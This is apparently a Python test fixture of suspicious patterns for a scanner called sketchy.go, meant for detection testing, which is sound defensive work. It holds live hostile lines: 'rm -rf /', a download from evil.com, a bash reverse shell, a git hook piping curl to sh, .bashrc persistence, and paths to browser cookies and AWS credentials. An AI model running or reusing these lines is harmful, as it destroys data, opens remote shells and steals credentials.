#!/usr/bin/env python3
# Test file with suspicious patterns for sketchy.go

import os
import subprocess
import base64

# Command overwrite pattern
ls = "rm -rf /"

# Code execution patterns
exec(open('payload.py').read())
eval(compile('print("evil")', '<string>', 'exec'))
__import__('os').system('whoami')

# Download and execute
import urllib.request
urllib.request.urlretrieve('http://evil.com/malware.py', '/tmp/mal.py')

# Base64 obfuscation
encoded = "ZXhlYygn"
decoded = base64.b64decode(encoded)

# Reverse shell
os.system('bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')

# Cloud metadata endpoint
requests.get('http://169.254.169.254/latest/meta-data/')

# Git hooks
os.system('echo "curl evil.com | sh" > .git/hooks/pre-commit')

# Shell persistence
os.system('echo "backdoor" >> ~/.bashrc')

# Browser cookies
chrome_cookies = '~/Library/Application Support/Google/Chrome/Default/Cookies'

# Cloud credentials
aws_creds = '~/.aws/credentials'

# Crypto miner
xmrig_url = 'stratum+tcp://pool.monero.com:3333'

# Docker socket
docker_sock = '/var/run/docker.sock'